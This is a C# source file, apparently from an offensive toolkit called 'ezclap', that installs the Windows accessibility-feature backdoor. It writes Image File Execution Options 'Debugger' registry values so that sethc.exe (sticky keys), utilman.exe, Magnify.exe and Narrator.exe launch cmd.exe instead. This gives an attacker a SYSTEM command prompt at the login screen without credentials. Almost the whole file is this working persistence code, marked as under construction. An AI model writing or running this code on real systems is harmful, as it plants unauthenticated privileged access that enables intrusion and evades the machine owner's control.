using System;


/*
 *  Name: AddAccessibility
 *  Description: Creates a "debugger" payload to be executed through different accessibility feature of Windows 
 *  These are sticky keys(shift * 5), utilman... [UnderConstruction]
 * 
 *  TODO: Need to re-think about this 
 */

namespace ezclap
{
	public class AddAccessibility
    {
		public AddAccessibility(string[] payload)
        {
            Initialize(payload);
        }
		public static void Initialize(string[] payload)
        {
            Random rnd = new Random();
            string[] accessibility = new string[] { "sethc.exe", "utilman.exe", "Magnify.exe", "Narrator.exe" };
            foreach (string binary in accessibility)
            {
                string finalLoc = RegistryKeys.hklmImageFileExec + "\\" + binary;
                Utils.setHKLMSubKey(finalLoc, "Debugger", @"C:\Windows\System32\cmd.exe");
            }
        }
    }
}
